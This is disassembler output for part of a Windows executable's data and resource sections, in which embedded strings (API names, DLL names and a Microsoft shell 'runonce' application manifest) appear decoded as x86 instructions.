  4091fa:	imul   ebp,DWORD PTR ds:0x772d736d,0x652d6e69
  409204:	jbe    0x40926b
  409206:	outs   dx,BYTE PTR ds:[esi]
  409207:	je     0x409272
  409209:	outs   dx,BYTE PTR ds:[esi]
  40920a:	addr16 sub eax,0x746e6f63
  409210:	jb     0x409281
  409212:	ins    BYTE PTR es:[edi],dx
  409213:	ins    BYTE PTR es:[edi],dx
  409214:	gs jb  0x409244
  409217:	ins    BYTE PTR es:[edi],dx
  409218:	xor    DWORD PTR ds:0x2e302d31,ebp
  40921e:	fs ins BYTE PTR es:[edi],dx
  409220:	ins    BYTE PTR es:[edi],dx
  409221:	add    BYTE PTR [ecx+0x70],ah
  409224:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  40922e:	outs   dx,DWORD PTR ds:[esi]
  40922f:	jb     0x409296
  409231:	sub    eax,0x656c6966
  409236:	sub    eax,0x322d316c
  40923b:	sub    eax,0x6c642e31
  409240:	ins    BYTE PTR es:[edi],dx
  409241:	add    BYTE PTR [edx],dh
  409243:	add    eax,0x54746553
  409248:	gs jb  0x4092b8
  40924b:	jae    0x4092bf
  40924d:	jbe    0x409290
  40924f:	jo     0x4092c1
  409251:	dec    ecx
  409252:	outs   dx,BYTE PTR ds:[esi]
  409253:	jae    0x4092c9
  409255:	popa   
  409256:	ins    BYTE PTR es:[edi],dx
  409257:	ins    BYTE PTR es:[edi],dx
  409258:	dec    ebp
  409259:	outs   dx,DWORD PTR ds:[esi]
  40925a:	fs add BYTE PTR gs:[eax],al
  40925e:	syscall 
  409260:	push   ebx
  409261:	gs je  0x4092ad
  409264:	outs   dx,BYTE PTR ds:[esi]
  409265:	outs   dx,WORD PTR ds:[esi]
  409267:	jb     0x4092d6
  409269:	popa   
  40926a:	je     0x4092d5
  40926c:	outs   dx,DWORD PTR ds:[esi]
  40926d:	outs   dx,BYTE PTR ds:[esi]
  40926e:	dec    edx
  40926f:	outs   dx,DWORD PTR ds:[esi]
  409270:	bound  ecx,QWORD PTR [edi+0x62]
  409273:	push   0x65
  409275:	arpl   WORD PTR [eax+eax*1-0x39],si
  409279:	add    BYTE PTR [ebx+0x72],al
  40927c:	gs popa 
  40927e:	je     0x4092e5
  409280:	dec    edx
  409281:	outs   dx,DWORD PTR ds:[esi]
  409282:	bound  ecx,QWORD PTR [edi+0x62]
  409285:	push   0x65
  409287:	arpl   WORD PTR [edi+edx*2+0x0],si
  40928b:	add    BYTE PTR [eax+eax*1],bl
  40928e:	inc    ecx
  40928f:	jae    0x409304
  409291:	imul   esp,DWORD PTR [edi+0x6e],0x636f7250
  409298:	gs jae 0x40930e
  40929b:	push   esp
  40929c:	outs   dx,DWORD PTR ds:[esi]
  40929d:	dec    edx
  40929e:	outs   dx,DWORD PTR ds:[esi]
  40929f:	bound  ecx,QWORD PTR [edi+0x62]
  4092a2:	push   0x65
  4092a4:	arpl   WORD PTR [eax+eax*1+0x0],si
  4092a8:	mov    edx,0x51744e01
  4092ad:	jne    0x409314
  4092af:	jb     0x40932a
  4092b1:	dec    ecx
  4092b2:	outs   dx,BYTE PTR ds:[esi]
  4092b3:	outs   dx,WORD PTR ds:[esi]
  4092b5:	jb     0x409324
  4092b7:	popa   
  4092b8:	je     0x409323
  4092ba:	outs   dx,DWORD PTR ds:[esi]
  4092bb:	outs   dx,BYTE PTR ds:[esi]
  4092bc:	push   eax
  4092bd:	jb     0x40932e
  4092bf:	arpl   WORD PTR [ebp+0x73],sp
  4092c2:	jae    0x4092c4
  4092c4:	mov    BYTE PTR [edx+edx*2],al
  4092c7:	je     0x409335
  4092c9:	dec    esi
  4092ca:	je     0x40931f
  4092cc:	je     0x40932f
  4092ce:	je     0x409345
  4092d0:	jae    0x409326
  4092d2:	outs   dx,DWORD PTR ds:[esi]
  4092d3:	inc    esp
  4092d4:	outs   dx,DWORD PTR ds:[esi]
  4092d5:	jae    0x40931c
  4092d7:	jb     0x40934b
  4092d9:	outs   dx,DWORD PTR ds:[esi]
  4092da:	jb     0x4092dc
  4092dc:	outs   dx,BYTE PTR ds:[esi]
  4092dd:	je     0x409343
  4092df:	ins    BYTE PTR es:[edi],dx
  4092e0:	ins    BYTE PTR es:[edi],dx
  4092e1:	cs fs ins BYTE PTR es:[edi],dx
  4092e4:	ins    BYTE PTR es:[edi],dx
  4092e5:	add    BYTE PTR [ebp+0x0],bl
  4092e8:	inc    ebx
  4092e9:	outs   dx,DWORD PTR ds:[esi]
  4092ea:	dec    ecx
  4092eb:	outs   dx,BYTE PTR ds:[esi]
  4092ec:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4092f4:	add    BYTE PTR [eax],al
  4092f6:	outs   dx,DWORD PTR ds:[esi]
  4092f7:	ins    BYTE PTR es:[edi],dx
  4092f8:	xor    esi,DWORD PTR gs:[edx]
  4092fb:	cs fs ins BYTE PTR es:[edi],dx
  4092fe:	ins    BYTE PTR es:[edi],dx
  4092ff:	add    BYTE PTR [eax+0x74784501],dl
  409305:	push   esp
  409306:	gs js  0x40937d
  409309:	dec    edi
  40930a:	jne    0x409380
  40930c:	push   edi
  40930d:	add    BYTE PTR [esi+0x73694400],dh
  409313:	jo     0x409376
  409315:	je     0x40937a
  409317:	push   0x7373654d
  40931c:	popa   
  40931d:	addr16 gs push edi
  409320:	add    BYTE PTR [eax],al
  409322:	xor    BYTE PTR [edx],al
  409324:	dec    esp
  409325:	outs   dx,DWORD PTR ds:[esi]
  409326:	popa   
  409327:	fs inc ebx
  409329:	jne    0x40939d
  40932b:	jae    0x40939c
  40932d:	jb     0x409386
  40932f:	add    bl,ch
  409331:	add    dl,BYTE PTR [ebx+0x65]
  409334:	je     0x409379
  409336:	jne    0x4093aa
  409338:	jae    0x4093a9
  40933a:	jb     0x40933c
  40933c:	arpl   WORD PTR [ebx],ax
  40933e:	push   esp
  40933f:	jb     0x4093a2
  409341:	outs   dx,BYTE PTR ds:[esi]
  409342:	jae    0x4093b0
  409344:	popa   
  409345:	je     0x4093ac
  409347:	dec    ebp
  409348:	gs jae 0x4093be
  40934b:	popa   
  40934c:	add    BYTE PTR gs:[bx+si],al
  409350:	add    BYTE PTR [edx],0x50
  409353:	outs   dx,DWORD PTR ds:[esi]
  409354:	jae    0x4093ca
  409356:	push   ecx
  409357:	jne    0x4093c2
  409359:	je     0x4093a8
  40935b:	gs jae 0x4093d1
  40935e:	popa   
  40935f:	add    BYTE PTR gs:[bp+di+0x2],bh
  409364:	push   eax
  409365:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  40936b:	jae    0x4093ce
  40936d:	addr16 gs push edi
  409370:	add    BYTE PTR [eax],al
  409372:	add    cl,BYTE PTR fs:[ebp+0x73]
  409376:	addr16 push edi
  409378:	popa   
  409379:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  409381:	je     0x4093ec
  409383:	jo     0x4093f1
  409385:	gs dec edi
  409387:	bound  ebp,QWORD PTR [edx+0x65]
  40938a:	arpl   WORD PTR [ebx+esi*2+0x45],si
  40938e:	js     0x409390
  409390:	outs   dx,BYTE PTR ds:[esi]
  409391:	add    BYTE PTR [ebx+0x72],al
  409394:	gs popa 
  409396:	je     0x4093fd
  409398:	push   eax
  409399:	outs   dx,DWORD PTR ds:[esi]
  40939a:	jo     0x409411
  40939c:	jo     0x4093eb
  40939e:	outs   dx,BYTE PTR gs:[esi]
  4093a0:	jne    0x4093a2
  4093a2:	push   0x74654701
  4093a7:	dec    ebp
  4093a8:	outs   dx,BYTE PTR gs:[esi]
  4093aa:	jne    0x4093f0
  4093ac:	gs popaw 
  4093af:	jne    0x40941d
  4093b1:	je     0x4093fc
  4093b3:	je     0x40941a
  4093b5:	ins    DWORD PTR es:[edi],dx
  4093b6:	add    BYTE PTR [eax],al
  4093b8:	lods   al,BYTE PTR ds:[esi]
  4093b9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4093bd:	je     0x409431
  4093bf:	outs   dx,DWORD PTR ds:[esi]
  4093c0:	jns    0x40940f
  4093c2:	outs   dx,BYTE PTR gs:[esi]
  4093c4:	jne    0x4093c6
  4093c6:	jg     0x4093cd
  4093c8:	ja     0x40942d
  4093ca:	jae    0x40943e
  4093cc:	arpl   WORD PTR [eax+0x72],bp
  4093cf:	add    ah,ch
  4093d1:	add    ebx,DWORD PTR [edi+0x76]
  4093d4:	jae    0x409444
  4093d6:	ja     0x409448
  4093d8:	jb     0x409443
  4093da:	outs   dx,BYTE PTR ds:[esi]
  4093db:	je     0x409443
  4093dd:	add    BYTE PTR [edx],bl
  4093df:	add    ebx,DWORD PTR [edi+0x70]
  4093e2:	jne    0x409456
  4093e4:	arpl   WORD PTR gs:[ecx+0x6c],sp
  4093e8:	ins    BYTE PTR es:[edi],dx
  4093e9:	add    ch,al
  4093eb:	add    al,0x66
  4093ed:	jb     0x409454
  4093ef:	add    BYTE PTR gs:[eax],al
  4093f2:	jns    0x4093f4
  4093f4:	pop    edi
  4093f5:	pop    edi
  4093f6:	inc    ebx
  4093f7:	js     0x409471
  4093f9:	inc    esi
  4093fa:	jb     0x40945d
  4093fc:	ins    DWORD PTR es:[edi],dx
  4093fd:	gs dec eax
  4093ff:	popa   
  409400:	outs   dx,BYTE PTR ds:[esi]
  409401:	fs ins BYTE PTR es:[edi],dx
  409403:	gs jb  0x409439
  409406:	add    BYTE PTR [eax],al
  409408:	test   BYTE PTR [eax],al
  40940a:	push   ebx
  40940b:	dec    eax
  40940c:	inc    edx
  40940d:	imul   ebp,DWORD PTR [esi+0x64],0x61506f54
  409414:	jb     0x40947b
  409416:	outs   dx,BYTE PTR ds:[esi]
  409417:	je     0x409419
  409419:	add    BYTE PTR [ebx+0x74615000],al
  40941f:	push   0x746f7551
  409424:	gs push ebx
  409426:	jo     0x409489
  409428:	arpl   WORD PTR [ebp+0x73],sp
  40942b:	push   edi
  40942c:	add    BYTE PTR [eax],al
  40942e:	adc    eax,DWORD PTR [eax]
  409430:	inc    edi
  409431:	gs je  0x409481
  409434:	outs   dx,DWORD PTR ds:[esi]
  409435:	fs jne 0x4094a4
  409438:	gs dec eax
  40943a:	popa   
  40943b:	outs   dx,BYTE PTR ds:[esi]
  40943c:	fs ins BYTE PTR es:[edi],dx
  40943e:	gs push edi
  409440:	add    BYTE PTR [eax],al
  409442:	adc    al,BYTE PTR [eax]
  409444:	inc    edi
  409445:	gs je  0x409495
  409448:	outs   dx,DWORD PTR ds:[esi]
  409449:	fs jne 0x4094b8
  40944c:	gs dec eax
  40944e:	popa   
  40944f:	outs   dx,BYTE PTR ds:[esi]
  409450:	fs ins BYTE PTR es:[edi],dx
  409452:	gs inc ebp
  409454:	js     0x4094ad
  409456:	add    BYTE PTR [eax],al
  409458:	push   cs
  409459:	add    BYTE PTR [edi+0x65],al
  40945c:	je     0x4094ab
  40945e:	outs   dx,DWORD PTR ds:[esi]
  40945f:	fs jne 0x4094ce
  409462:	gs inc esi
  409464:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  40946c:	add    BYTE PTR [eax],al
  40946e:	std    
  40946f:	add    al,0x6d
  409471:	popa   
  409472:	ins    BYTE PTR es:[edi],dx
  409473:	ins    BYTE PTR es:[edi],dx
  409474:	outs   dx,DWORD PTR ds:[esi]
  409475:	arpl   WORD PTR [eax],ax
  409477:	add    BYTE PTR [edx],ah
  409479:	add    DWORD PTR [edi+0x63],ebx
  40947c:	popa   
  40947d:	ins    BYTE PTR es:[edi],dx
  40947e:	ins    BYTE PTR es:[edi],dx
  40947f:	outs   dx,BYTE PTR ds:[esi]
  409480:	gs ja  0x4094eb
  409483:	add    BYTE PTR ds:0x6d656d05,cl
  409489:	jae    0x4094f0
  40948b:	je     0x40948d
	...

Disassembly of section .rsrc:

0040a000 <.rsrc>:
	...
  40a00c:	add    DWORD PTR [eax],eax
  40a00e:	add    al,0x0
  40a010:	js     0x40a013
  40a012:	add    BYTE PTR [eax-0x7fffffc8],al
  40a018:	add    eax,DWORD PTR [eax]
  40a01a:	add    BYTE PTR [eax],al
  40a01c:	push   eax
  40a01d:	add    BYTE PTR [eax],al
  40a01f:	or     BYTE PTR [esi],0x0
  40a022:	add    BYTE PTR [eax],al
  40a024:	push   0x10800000
  40a029:	add    BYTE PTR [eax],al
  40a02b:	add    BYTE PTR [eax+0x18800000],al
  40a031:	add    BYTE PTR [eax],al
  40a033:	add    BYTE PTR [eax+0x800000],bl
	...
  40a045:	add    BYTE PTR [ecx],al
  40a047:	add    BYTE PTR [ecx],al
  40a049:	add    BYTE PTR [eax],al
  40a04b:	add    BYTE PTR [eax+0x800000],dh
	...
  40a05d:	add    BYTE PTR [ecx],al
  40a05f:	add    BYTE PTR [ecx],al
  40a061:	add    BYTE PTR [eax],al
  40a063:	add    al,cl
  40a065:	add    BYTE PTR [eax],al
  40a067:	add    BYTE PTR [eax],0x0
	...
  40a076:	add    DWORD PTR [eax],eax
  40a078:	push   0x0
  40a07a:	add    BYTE PTR [eax],al
  40a07c:	loopne 0x40a07e
  40a07e:	add    BYTE PTR [eax+0x0],al
	...
  40a08c:	add    BYTE PTR [eax],al
  40a08e:	add    DWORD PTR [eax],eax
  40a090:	add    DWORD PTR [eax],eax
  40a092:	add    BYTE PTR [eax],al
  40a094:	clc    
  40a095:	add    BYTE PTR [eax],al
  40a097:	add    BYTE PTR [eax],0x0
	...
  40a0a6:	add    DWORD PTR [eax],eax
  40a0a8:	add    DWORD PTR [eax],eax
  40a0aa:	add    BYTE PTR [eax],al
  40a0ac:	adc    BYTE PTR [ecx],al
  40a0ae:	add    BYTE PTR [eax+0x0],al
	...
  40a0bc:	add    BYTE PTR [eax],al
  40a0be:	add    DWORD PTR [eax],eax
  40a0c0:	or     DWORD PTR [eax+eax*1],eax
  40a0c3:	add    BYTE PTR [eax],ch
  40a0c5:	add    DWORD PTR [eax],eax
	...
  40a0d3:	add    BYTE PTR [eax],al
  40a0d5:	add    BYTE PTR [ecx],al
  40a0d7:	add    BYTE PTR [ecx],cl
  40a0d9:	add    al,0x0
  40a0db:	add    BYTE PTR [eax],bh
  40a0dd:	add    DWORD PTR [eax],eax
	...
  40a0eb:	add    BYTE PTR [eax],al
  40a0ed:	add    BYTE PTR [ecx],al
  40a0ef:	add    BYTE PTR [ecx],cl
  40a0f1:	add    al,0x0
  40a0f3:	add    BYTE PTR [eax+0x1],cl
	...
  40a106:	add    DWORD PTR [eax],eax
  40a108:	or     DWORD PTR [eax+eax*1],eax
  40a10b:	add    BYTE PTR [eax+0x1],bl
	...
  40a11e:	add    DWORD PTR [eax],eax
  40a120:	or     DWORD PTR [eax+eax*1],eax
  40a123:	add    BYTE PTR [eax+0x1],ch
  40a126:	add    BYTE PTR [eax],al
  40a128:	cwde   
  40a129:	lods   al,BYTE PTR ds:[esi]
  40a12a:	add    BYTE PTR [eax],al
  40a12c:	fadd   DWORD PTR [eax]
	...
  40a136:	add    BYTE PTR [eax],al
  40a138:	cwde   
  40a139:	test   eax,0x2e80000
	...
  40a146:	add    BYTE PTR [eax],al
  40a148:	sub    BYTE PTR [eax+eax*1+0x1400],0x0
	...
  40a158:	sbb    BYTE PTR [esi+0x3800000],ah
	...
  40a166:	add    BYTE PTR [eax],al
  40a168:	and    BYTE PTR [ecx+0x4920000],0x0
	...
  40a177:	add    BYTE PTR [ebx],al
  40a179:	add    BYTE PTR [ebp+0x0],cl
  40a17c:	push   ebp
  40a17d:	add    BYTE PTR [ecx+0x0],cl
  40a180:	cmp    al,0x3f
  40a182:	js     0x40a1f1
  40a184:	ins    BYTE PTR es:[edi],dx
  40a185:	and    BYTE PTR [esi+0x65],dh
  40a188:	jb     0x40a1fd
  40a18a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a191:	xor    BYTE PTR [edx],ah
  40a193:	and    BYTE PTR [ebp+0x6e],ah
  40a196:	arpl   WORD PTR [edi+0x64],bp
  40a199:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40a1a0:	inc    esi
  40a1a1:	sub    eax,0x73202238
  40a1a6:	je     0x40a209
  40a1a8:	outs   dx,BYTE PTR ds:[esi]
  40a1a9:	fs popa 
  40a1ab:	ins    BYTE PTR es:[edi],dx
  40a1ac:	outs   dx,DWORD PTR ds:[esi]
  40a1ad:	outs   dx,BYTE PTR ds:[esi]
  40a1ae:	gs cmp eax,0x73657922
  40a1b4:	and    bh,BYTE PTR [edi]
  40a1b6:	ds or  eax,0x2d213c0a
  40a1bc:	sub    eax,0x706f4320
  40a1c1:	jns    0x40a235
  40a1c3:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40a1ca:	sub    DWORD PTR [eax],esp
  40a1cc:	dec    ebp
  40a1cd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a1d4:	je     0x40a1f6
  40a1d6:	inc    ebx
  40a1d7:	outs   dx,DWORD PTR ds:[esi]
  40a1d8:	jb     0x40a24a
  40a1da:	outs   dx,DWORD PTR ds:[esi]
  40a1db:	jb     0x40a23e
  40a1dd:	je     0x40a248
  40a1df:	outs   dx,DWORD PTR ds:[esi]
  40a1e0:	outs   dx,BYTE PTR ds:[esi]
  40a1e1:	and    BYTE PTR ds:0xa0d3e2d,ch
  40a1e7:	cmp    al,0x61
  40a1e9:	jae    0x40a25e
  40a1eb:	gs ins DWORD PTR es:[edi],dx
  40a1ed:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40a1f1:	js     0x40a260
  40a1f3:	ins    BYTE PTR es:[edi],dx
  40a1f4:	outs   dx,BYTE PTR ds:[esi]
  40a1f5:	jae    0x40a234
  40a1f7:	and    dh,BYTE PTR [ebp+0x72]
  40a1fa:	outs   dx,BYTE PTR ds:[esi]
  40a1fb:	cmp    dh,BYTE PTR [ebx+0x63]
  40a1fe:	push   0x73616d65
  40a203:	sub    eax,0x7263696d
  40a208:	outs   dx,DWORD PTR ds:[esi]
  40a209:	jae    0x40a27a
  40a20b:	data16 je 0x40a23b
  40a20e:	arpl   WORD PTR [edi+0x6d],bp
  40a211:	cmp    ah,BYTE PTR [ecx+0x73]
  40a214:	ins    DWORD PTR es:[edi],dx
  40a215:	cs jbe 0x40a249
  40a218:	and    ah,BYTE PTR [eax]
  40a21a:	ins    DWORD PTR es:[edi],dx
  40a21b:	popa   
  40a21c:	outs   dx,BYTE PTR ds:[esi]
  40a21d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40a224:	jb     0x40a299
  40a226:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a22d:	xor    BYTE PTR [edx],ah
  40a22f:	ds or  eax,0x73613c0a
  40a235:	jae    0x40a29c
  40a237:	ins    DWORD PTR es:[edi],dx
  40a238:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a23c:	fs outs dx,BYTE PTR gs:[esi]
  40a23f:	je     0x40a2aa
  40a241:	je     0x40a2bc
  40a243:	or     eax,0x2020200a
  40a248:	and    BYTE PTR [esi+0x61],ch
  40a24b:	ins    DWORD PTR es:[edi],dx
  40a24c:	gs cmp eax,0x63694d22
  40a252:	jb     0x40a2c3
  40a254:	jae    0x40a2c5
  40a256:	data16 je 0x40a287
  40a259:	push   edi
  40a25a:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40a261:	push   ebx
  40a262:	push   0x2e6c6c65
  40a267:	jb     0x40a2de
  40a269:	outs   dx,BYTE PTR ds:[esi]
  40a26a:	outs   dx,DWORD PTR ds:[esi]
  40a26b:	outs   dx,BYTE PTR ds:[esi]
  40a26c:	arpl   WORD PTR [ebp+0x22],sp
  40a26f:	or     eax,0x2020200a
  40a274:	and    BYTE PTR [eax+0x72],dh
  40a277:	outs   dx,DWORD PTR ds:[esi]
  40a278:	arpl   WORD PTR [ebp+0x73],sp
  40a27b:	jae    0x40a2ec
  40a27d:	jb     0x40a2c0
  40a27f:	jb     0x40a2e4
  40a281:	push   0x63657469
  40a286:	je     0x40a2fd
  40a288:	jb     0x40a2ef
  40a28a:	cmp    eax,0x36387822
  40a28f:	and    cl,BYTE PTR ds:0x2020200a
  40a295:	and    BYTE PTR [esi+0x65],dh
  40a298:	jb     0x40a30d
  40a29a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40a2a1:	xor    DWORD PTR [esi],ebp
  40a2a3:	xor    BYTE PTR [esi],ch
  40a2a5:	xor    BYTE PTR [edx],ah
  40a2a7:	or     eax,0x2020200a
  40a2ac:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40a2b0:	gs cmp eax,0x6e697722
  40a2b6:	xor    esi,DWORD PTR [edx]
  40a2b8:	and    ch,BYTE PTR [edi]
  40a2ba:	ds or  eax,0x65643c0a
  40a2c0:	jae    0x40a325
  40a2c2:	jb     0x40a32d
  40a2c4:	jo     0x40a33a
  40a2c6:	imul   ebp,DWORD PTR [edi+0x6e],0x6e69573e
  40a2cd:	outs   dx,DWORD PTR fs:[esi]
  40a2cf:	ja     0x40a344
  40a2d1:	and    BYTE PTR [ebx+0x68],dl
  40a2d4:	gs ins BYTE PTR es:[edi],dx
  40a2d6:	ins    BYTE PTR es:[edi],dx
  40a2d7:	cmp    al,0x2f
  40a2d9:	fs gs jae 0x40a340
  40a2dd:	jb     0x40a348
  40a2df:	jo     0x40a355
  40a2e1:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  40a2e8:	fs gs jo 0x40a351
  40a2ec:	outs   dx,BYTE PTR ds:[esi]
  40a2ed:	fs outs dx,BYTE PTR gs:[esi]
  40a2f0:	arpl   WORD PTR [ecx+0x3e],di
  40a2f3:	or     eax,0x2020200a
  40a2f8:	and    BYTE PTR [esp+eiz*2],bh
  40a2fb:	gs jo  0x40a363
  40a2fe:	outs   dx,BYTE PTR ds:[esi]
  40a2ff:	fs outs dx,BYTE PTR gs:[esi]
  40a302:	je     0x40a345
  40a304:	jae    0x40a379
  40a306:	gs ins DWORD PTR es:[edi],dx
  40a308:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a30c:	or     eax,0x2020200a
  40a311:	and    BYTE PTR [eax],ah
  40a313:	and    BYTE PTR [eax],ah
  40a315:	and    BYTE PTR [ecx+eiz*2],bh
  40a318:	jae    0x40a38d
  40a31a:	gs ins DWORD PTR es:[edi],dx
  40a31c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a320:	fs outs dx,BYTE PTR gs:[esi]
  40a323:	je     0x40a38e
  40a325:	je     0x40a3a0
  40a327:	or     eax,0x2020200a
  40a32c:	and    BYTE PTR [eax],ah
  40a32e:	and    BYTE PTR [eax],ah
  40a330:	and    BYTE PTR [eax],ah
  40a332:	and    BYTE PTR [eax],ah
  40a334:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40a338:	gs cmp eax,0x6e697722
  40a33e:	xor    esi,DWORD PTR [edx]
  40a340:	and    cl,BYTE PTR ds:0x2020200a
  40a346:	and    BYTE PTR [eax],ah
  40a348:	and    BYTE PTR [eax],ah
  40a34a:	and    BYTE PTR [eax],ah
  40a34c:	and    BYTE PTR [eax],ah
  40a34e:	and    BYTE PTR [esi+0x61],ch
  40a351:	ins    DWORD PTR es:[edi],dx
  40a352:	gs cmp eax,0x63694d22
  40a358:	jb     0x40a3c9
  40a35a:	jae    0x40a3cb
  40a35c:	data16 je 0x40a38d
  40a35f:	push   edi
  40a360:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40a367:	inc    ebx
  40a368:	outs   dx,DWORD PTR ds:[esi]
  40a369:	ins    DWORD PTR es:[edi],dx
  40a36a:	ins    DWORD PTR es:[edi],dx
  40a36b:	outs   dx,DWORD PTR ds:[esi]
  40a36c:	outs   dx,BYTE PTR ds:[esi]
  40a36d:	sub    eax,0x746e6f43
  40a372:	jb     0x40a3e3
  40a374:	ins    BYTE PTR es:[edi],dx
  40a375:	jae    0x40a399
  40a377:	or     eax,0x2020200a
  40a37c:	and    BYTE PTR [eax],ah
  40a37e:	and    BYTE PTR [eax],ah
  40a380:	and    BYTE PTR [eax],ah
  40a382:	and    BYTE PTR [eax],ah
  40a384:	and    BYTE PTR [esi+0x65],dh
  40a387:	jb     0x40a3fc
  40a389:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  40a390:	xor    BYTE PTR [esi],ch
  40a392:	xor    BYTE PTR [esi],ch
  40a394:	xor    BYTE PTR [edx],ah
  40a396:	or     eax,0x2020200a
  40a39b:	and    BYTE PTR [eax],ah
  40a39d:	and    BYTE PTR [eax],ah
  40a39f:	and    BYTE PTR [eax],ah
  40a3a1:	and    BYTE PTR [eax],ah
  40a3a3:	and    BYTE PTR [eax+0x72],dh
  40a3a6:	outs   dx,DWORD PTR ds:[esi]
  40a3a7:	arpl   WORD PTR [ebp+0x73],sp
  40a3aa:	jae    0x40a41b
  40a3ac:	jb     0x40a3ef
  40a3ae:	jb     0x40a413
  40a3b0:	push   0x63657469
  40a3b5:	je     0x40a42c
  40a3b7:	jb     0x40a41e
  40a3b9:	cmp    eax,0xd222a22
  40a3be:	or     ah,BYTE PTR [eax]
  40a3c0:	and    BYTE PTR [eax],ah
  40a3c2:	and    BYTE PTR [eax],ah
  40a3c4:	and    BYTE PTR [eax],ah
  40a3c6:	and    BYTE PTR [eax],ah
  40a3c8:	and    BYTE PTR [eax],ah
  40a3ca:	and    BYTE PTR [eax+0x75],dh
  40a3cd:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40a3d1:	dec    ebx
  40a3d2:	gs jns 0x40a429
  40a3d5:	outs   dx,DWORD PTR ds:[esi]
  40a3d6:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40a3da:	and    dh,BYTE PTR [esi]
  40a3dc:	xor    eax,0x36623539
  40a3e1:	xor    al,0x31
  40a3e3:	xor    al,0x34
  40a3e5:	arpl   WORD PTR [ebx+0x66],sp
  40a3e8:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  40a3ec:	or     eax,0x2020200a
  40a3f1:	and    BYTE PTR [eax],ah
  40a3f3:	and    BYTE PTR [eax],ah
  40a3f5:	and    BYTE PTR [eax],ah
  40a3f7:	and    BYTE PTR [eax],ah
  40a3f9:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  40a3fd:	addr16 jne 0x40a461
  40a400:	addr16 gs cmp eax,0xd222a22
  40a407:	or     ah,BYTE PTR [eax]
  40a409:	and    BYTE PTR [eax],ah
  40a40b:	and    BYTE PTR [eax],ah
  40a40d:	and    BYTE PTR [eax],ah
  40a40f:	and    BYTE PTR [edi],ch
  40a411:	ds or  eax,0x2020200a
  40a417:	and    BYTE PTR [edi+ebp*1],bh
  40a41a:	fs gs jo 0x40a483
  40a41e:	outs   dx,BYTE PTR ds:[esi]
  40a41f:	fs outs dx,BYTE PTR gs:[esi]
  40a422:	je     0x40a465
  40a424:	jae    0x40a499
  40a426:	gs ins DWORD PTR es:[edi],dx
  40a428:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a42c:	or     eax,0x642f3c0a
  40a431:	gs jo  0x40a499
  40a434:	outs   dx,BYTE PTR ds:[esi]
  40a435:	fs outs dx,BYTE PTR gs:[esi]
  40a438:	arpl   WORD PTR [ecx+0x3e],di
  40a43b:	or     eax,0x72743c0a
  40a440:	jne    0x40a4b5
  40a442:	je     0x40a48d
  40a444:	outs   dx,BYTE PTR ds:[esi]
  40a445:	outs   dx,WORD PTR ds:[esi]
  40a447:	and    BYTE PTR [eax+0x6d],bh
  40a44a:	ins    BYTE PTR es:[edi],dx
  40a44b:	outs   dx,BYTE PTR ds:[esi]
  40a44c:	jae    0x40a48b
  40a44e:	and    dh,BYTE PTR [ebp+0x72]
  40a451:	outs   dx,BYTE PTR ds:[esi]
  40a452:	cmp    dh,BYTE PTR [ebx+0x63]
  40a455:	push   0x73616d65
  40a45a:	sub    eax,0x7263696d
  40a45f:	outs   dx,DWORD PTR ds:[esi]
  40a460:	jae    0x40a4d1
  40a462:	data16 je 0x40a492
  40a465:	arpl   WORD PTR [edi+0x6d],bp
  40a468:	cmp    ah,BYTE PTR [ecx+0x73]
  40a46b:	ins    DWORD PTR es:[edi],dx
  40a46c:	cs jbe 0x40a4a2
  40a46f:	and    bh,BYTE PTR [esi]
  40a471:	or     eax,0x2020200a
  40a476:	and    BYTE PTR [ebx+esi*2],bh
  40a479:	arpl   WORD PTR gs:[ebp+0x72],si
  40a47d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40a485:	and    BYTE PTR [eax],ah
  40a487:	and    BYTE PTR [eax],ah
  40a489:	and    BYTE PTR [eax],ah
  40a48b:	cmp    al,0x72
  40a48d:	gs jno 0x40a505
  40a490:	gs jae 0x40a507
  40a493:	gs fs push eax
  40a496:	jb     0x40a501
  40a498:	jbe    0x40a503
  40a49a:	ins    BYTE PTR es:[edi],dx
  40a49b:	gs addr16 gs jae 0x40a4de
  40a4a0:	or     eax,0x2020200a
  40a4a5:	and    BYTE PTR [eax],ah
  40a4a7:	and    BYTE PTR [eax],ah
  40a4a9:	and    BYTE PTR [eax],ah
  40a4ab:	and    BYTE PTR [eax],ah
  40a4ad:	and    BYTE PTR [edx+esi*2],bh
  40a4b0:	gs jno 0x40a528
  40a4b3:	gs jae 0x40a52a
  40a4b6:	gs fs inc ebp
  40a4b9:	js     0x40a520
  40a4bb:	arpl   WORD PTR [ebp+0x74],si
  40a4be:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40a4c5:	ins    BYTE PTR es:[edi],dx
  40a4c6:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40a4ca:	gs ins BYTE PTR es:[edi],dx
  40a4cc:	cmp    eax,0x49736122
  40a4d1:	outs   dx,BYTE PTR ds:[esi]
  40a4d2:	jbe    0x40a543
